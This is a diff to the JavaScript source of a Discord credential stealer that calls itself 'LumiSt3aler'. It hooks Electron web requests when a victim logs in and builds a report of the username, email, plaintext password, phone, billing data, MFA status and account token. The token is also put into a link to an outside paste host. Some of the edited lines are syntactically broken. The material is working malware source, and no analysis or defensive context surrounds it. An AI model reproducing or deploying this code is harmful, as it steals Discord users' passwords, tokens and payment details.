@@ -281,12 +281,12 @@ async function initOne() {
         },
         {
             name: "Infected App:",
-            value: "<:c_nitro:1249820987403407381> `" + appName + "`",
+            value: "<:c_nitro:1256070931084869693> `" + appName + "`",
             inline: true
         },
         {
             name: "Computer Name:",
-            value: "<:emoji_54:1249821065236975686> `" + computerName + "`",
+            value: "<:lista:1256070773932822579> `" + computerName + "`",
             inline: true
         },
         {
@@ -386,61 +386,61 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         return true;
       }
 
-      const embedLogin = {
-        title: "Login Detected - LumiSt3aler",
-        color: 0x5a0998,
-        fields: [
-          {
+const embedLogin = {
+    title: "Login Detected - LumiSt3aler",
+    color: 0x5a0998,
+    fields: [
+        {
             name: "Username:",
-            value: "`"+user.username+"`",
+            value: ""+user.username+"",
             inline: true
-          },
-          {
+        },
+        {
             name: "ID:",
-            value: "`"+user.id+"`",
+            value: ""+user.id+"",
             inline: true
-          },
-          {
+        },
+        {
             name: "Nitro:",
-            value: `${GetNitro(Nitro)}`,
+            value: ${GetNitro(Nitro)},
             inline: true
-          },
-          {
+        },
+        {
             name: "Email:",
-            value: "`"+user.email+"`",
+            value: ""+user.email+"",
             inline: true
-          },
-          {
+        },
+        {
             name: "Password:",
-            value: "`"+password+"`",
+            value: ""+password+"",
             inline: true
-          },
-          {
+        },
+        {
             name: "Phone:",
-            value: "`"+user.phone+"`",
+            value: ""+user.phone+"",
             inline: true
-          },
-          {
+        },
+        {
             name: "Billing:",
-            value: Billings,
+            value: `${Billings} <:correto:1265368318257270804>`,
             inline: true
-          },
-          {
+        },
+        {
             name: "MFA:",
             value: GetA2F(user.mfa_enabled),
             inline: true
-          },
-          {
+        },
+        {
             name: "Badges:",
-            value: `${GetBadges(user.flags)}`,
+            value: ${GetBadges(user.flags)},
             inline: true
-          },
-          {
+        },
+        {
             name: "Token:",
             value: "||"+token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
             inline: false
-          },
-        ],
+        },
+    ],
         author: {
           name: user.username+"#0000 - LumiSt3aler",
           icon_url: userAvatar
